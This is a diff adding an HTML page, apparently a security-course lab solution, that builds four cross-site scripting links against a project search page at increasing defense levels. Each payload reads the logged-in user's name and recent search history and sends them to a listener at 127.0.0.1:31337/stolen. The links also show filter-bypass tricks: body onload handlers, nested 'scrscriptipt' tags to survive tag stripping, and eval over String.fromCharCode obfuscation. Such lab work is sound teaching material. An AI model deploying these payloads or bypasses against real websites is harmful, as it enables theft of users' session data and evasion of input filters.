@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://code.jquery.com/jquery-2.2.4.js"></script>
+</head>
+<body>
+<div><a id="first1">XSS1
+</a></div>
+<div> <a id="second1">XSS2
+</a>
+</div>
+<div><a id="third1">XSS3
+</a></div>
+<div><a id="fourth1">XSS4
+</a></div>
+<div id="test"> 
+</div>
+</body>
+<script>
+$(document).ready(function(){
+
+var initialPart = "http://www.ecen5032.org/project2/search?"; 
+//this is for the first part of XXS
+var code = "$( document ).ready(function() {var usr=document.getElementById('logged-in-user').innerText;var hstry = $('#history-list').children().eq(1).html();window.open('http://127.0.0.1:31337/stolen?user=' + usr + '&last_search=' + hstry); });";
+var iam = encodeURIComponent(code);
+var first1_lnk = initialPart + "xssdefense=0&q="+ "%3Cscript%3E" + iam + "%3C%2Fscript%3E"; 
+$("#first1").attr("href", first1_lnk);
+
+
+//this is for the SEcond part of XXS
+var iiam = encodeURIComponent("<body onload=\"(function() {var usr = document.getElementById('logged-in-user').innerText;var hstry = $('#history-list').children().eq(1).html(); window.open('http://127.0.0.1:31337/stolen?user=' + usr + '&last_search=' + hstry); })();\">");
+var second1_lnk = initialPart + "xssdefense=1&q=" + iiam ;
+$("#second1").attr("href", second1_lnk);
+
+//this is for the third part of XSS
+var third1_lnk = initialPart + "xssdefense=2&q="+ "%3Cscrscriptipt%3E" + iam + "%3C%2Fscrscriptipt%3E"; 
+$("#third1").attr("href", third1_lnk);
+
+
+//this is for the fourth part of XSS
+var bye= "";
+for (var i = 0; i< code.length ; i++)
+{
+  bye = bye + code[i].charCodeAt() + ',';
+}
+var fourth1_lnk = initialPart + "xssdefense=3&q="+ "%3Cscript%3E" + "eval(String.fromCharCode(" +  bye.substring(0, bye.length-1) + "))%3C%2Fscript%3E"; 
+$("#fourth1").attr("href", fourth1_lnk);
+
+});
+
+</script>
+</html> 
+
